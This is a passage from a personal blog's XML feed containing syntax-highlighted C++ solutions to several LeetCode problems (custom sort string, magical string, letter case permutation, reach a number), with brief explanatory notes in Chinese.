class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(pow) &#123;</span><br><span class="line">            <span class="keyword">if</span>(pow&amp;<span class="number">1</span>) &#123;</span><br><span class="line">                res = <span class="built_in">matMul</span>(a, res,m,m,m);</span><br><span class="line">            &#125;</span><br><span class="line">            a = <span class="built_in">matMul</span>(a, a,m,m,m);</span><br><span class="line">            pow = pow &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">matMul</span>(vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; a, vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt;&amp; b, <span class="type">int</span> m, <span class="type">int</span> n, <span class="type">int</span> k) &#123;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">c</span>(m, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(k));</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">                <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> l = <span class="number">0</span>; l &lt; n; l++) &#123;</span><br><span class="line">                    sum = (sum + (a[i][l]*b[l][j])%MOD)%MOD;</span><br><span class="line">                &#125;</span><br><span class="line">                c[i][j] = sum;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="791-自定义字符串排序"><a href="#791-自定义字符串排序" class="headerlink" title="791. 自定义字符串排序"></a><a href="https://leetcode.cn/problems/custom-sort-string/">791. 自定义字符串排序</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">string <span class="title">customSortString</span><span class="params">(string order, string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> lenO = order.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> argOrder[<span class="number">26</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; lenO; i++) &#123;</span><br><span class="line">            argOrder[order[i]-<span class="string">&#x27;a&#x27;</span>] = i+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">sort</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>(), [&amp;](<span class="type">char</span> x, <span class="type">char</span> y) -&gt; <span class="type">bool</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> argOrder[x-<span class="string">&#x27;a&#x27;</span>] &lt; argOrder[y-<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;1668-最大重复子字符串&quot;&gt;&lt;a href=&quot;#1668-最大重复子字符串&quot; class=&quot;headerlink&quot; title=&quot;1668. 最大重复子字符串&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/maximum-repeating-substring/&quot;&gt;1668. 最大重复子字符串&lt;/a&gt;&lt;/h2&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;maxRepeating&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(string sequence, string word)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len1 = sequence.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; len2 = word.&lt;span class=&quot;built_in&quot;&gt;size&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; maxk = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; len1;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag = &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; next = i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;type&quot;&gt;bool&lt;/span&gt; flag1 = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; j &amp;lt; len2; j++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(sequence[i+j] != word[j]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    flag = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    &lt;span class=&quot;keyword&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!flag1 &amp;amp;&amp;amp; j != &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; sequence[i+j] == word[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    next = i+j;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    flag1=&lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; k &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; maxk &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(flag) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                k++;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                i += len2;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                maxk = &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(k, maxk);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(k == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    i+=&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                    i = i-len2+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                k = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;comment&quot;&gt;// cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; endl;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;max&lt;/span&gt;(maxk, k);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;blockquote&gt;
&lt;p&gt;笨方法，从右向左找，适当回溯&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;754-到达终点数字&quot;&gt;&lt;a href=&quot;#754-到达终点数字&quot; class=&quot;headerlink&quot; title=&quot;754. 到达终点数字&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/reach-a-number/&quot;&gt;754. 到达终点数字&lt;/a&gt;&lt;/h2&gt;&lt;h3 id=&quot;解法1&quot;&gt;&lt;a href=&quot;#解法1&quot; class=&quot;headerlink&quot; title=&quot;解法1&quot;&gt;&lt;/a&gt;解法1&lt;/h3&gt;&lt;figure class=&quot;highlight c++&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title class_&quot;&gt;Solution&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;public&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;reachNumber&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(&lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; target)&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        target = &lt;span class=&quot;built_in&quot;&gt;abs&lt;/span&gt;(target);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; n = (&lt;span class=&quot;built_in&quot;&gt;sqrt&lt;/span&gt;(&lt;span class=&quot;number&quot;&gt;8.0&lt;/span&gt;*target+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&lt;span class=&quot;number&quot;&gt;-1&lt;/span&gt;)/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;; &lt;span class=&quot;comment&quot;&gt;//8.0,防止int溢出&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; sum = (n+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)*n/&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(sum == target) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;type&quot;&gt;int&lt;/span&gt; diff = target-sum;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt; &amp;amp;&amp;amp; diff % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) || (n % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; &amp;amp;&amp;amp; diff % &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(diff %&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt; == &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            n += &lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; n;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/categories/LeetCode/"/>
    
    
    <category term="LeetCode" scheme="https://jingtianer.github.io/home/tags/LeetCode/"/>
    
  </entry>
  
  <entry>
    <title>LeetCode-17</title>
    <link href="https://jingtianer.github.io/home/2022/11/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9317/"/>
    <id>https://jingtianer.github.io/home/2022/11/01/LeetCode/LeetCode-%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%9317/</id>
    <published>2022-11-01T10:14:34.000Z</published>
    <updated>2022-11-08T13:27:53.426Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1662-检查两个字符串数组是否相等"><a href="#1662-检查两个字符串数组是否相等" class="headerlink" title="1662. 检查两个字符串数组是否相等"></a><a href="https://leetcode.cn/problems/check-if-two-string-arrays-are-equivalent/">1662. 检查两个字符串数组是否相等</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">arrayStringsAreEqual</span><span class="params">(vector&lt;string&gt;&amp; word1, vector&lt;string&gt;&amp; word2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">join</span>(<span class="built_in">move</span>(word1)) == <span class="built_in">join</span>(<span class="built_in">move</span>(word2));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">string <span class="title">join</span><span class="params">(vector&lt;string&gt;&amp;&amp; word)</span> </span>&#123;</span><br><span class="line">        string s;</span><br><span class="line">        <span class="type">int</span> len = word.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">0</span>) <span class="keyword">return</span> s;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; len<span class="number">-1</span>; i++) &#123;</span><br><span class="line">            s += word[i];</span><br><span class="line">        &#125;</span><br><span class="line">        s+=word[len<span class="number">-1</span>];</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>实现一个join函数就好了</p></blockquote><h2 id="481-神奇字符串"><a href="#481-神奇字符串" class="headerlink" title="481. 神奇字符串"></a><a href="https://leetcode.cn/problems/magical-string/">481. 神奇字符串</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">magicalString</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> bit = <span class="number">3</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="type">bool</span> q[<span class="number">100005</span>] = &#123;<span class="literal">false</span>&#125;;</span><br><span class="line">        <span class="type">int</span> queue_front = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> queue_rear = <span class="number">0</span>;</span><br><span class="line">        <span class="type">bool</span> cur=<span class="number">1</span>;</span><br><span class="line">        <span class="type">bool</span> gen=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(bit &lt; n) &#123;</span><br><span class="line">            bit += cur+<span class="number">1</span>;</span><br><span class="line">            q[queue_front++] = gen;</span><br><span class="line">            <span class="keyword">if</span>(cur) &#123;</span><br><span class="line">                q[queue_front++] = gen;</span><br><span class="line">            &#125;</span><br><span class="line">            gen=<span class="number">1</span>-gen;</span><br><span class="line">            count+=gen?cur+gen:<span class="number">0</span>;</span><br><span class="line">            cur = q[queue_rear++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count -(bit&gt;n &amp;&amp; gen);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>关键在于想清楚如何生成这个神奇字符串，题目中说，s的前几个字符是12211<br>1生成1,s&#x3D;1<br>2生成22，因为前一个1生成了1，这个2不能也生成1,s&#x3D;122<br>2生成11，因为前一个2生成了2，这个2不能也生成2,s&#x3D;12211<br>1生成2，前一个2生成了1，这个1就只能生成2了,s&#x3D;122112<br>1生成1,s&#x3D;1221121<br>2生成22,s&#x3D;122112122</p></blockquote><blockquote><p>只要有前三个字符122，即可生成全部字符</p></blockquote><h2 id="784-字母大小写全排列"><a href="#784-字母大小写全排列" class="headerlink" title="784. 字母大小写全排列"></a><a href="https://leetcode.cn/problems/letter-case-permutation/">784. 字母大小写全排列</a></h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">vector&lt;string&gt; res;</span><br><span class="line"><span class="type">int</span> len;</span><br><span class="line">    <span class="function">vector&lt;string&gt; <span class="title">letterCasePermutation</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        len = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="built_in">search</span>(s, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">search</span><span class="params">(string s, <span class="type">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index&gt;=len) &#123;</span><br><span class="line">            res.<span class="built_in">emplace_back</span>(s);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">isalpha</span>(s[index])) &#123;</span><br><span class="line">            <span class="built_in">search</span>(s,index+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">isupper</span>(s[index])) &#123;</span><br><span class="line">                s[index] = s[index]-<span class="string">&#x27;A&#x27;</span>+<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                s[index] = s[index]-<span class="string">&#x27;a&#x27;</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">search</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">search</span>(s, index+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 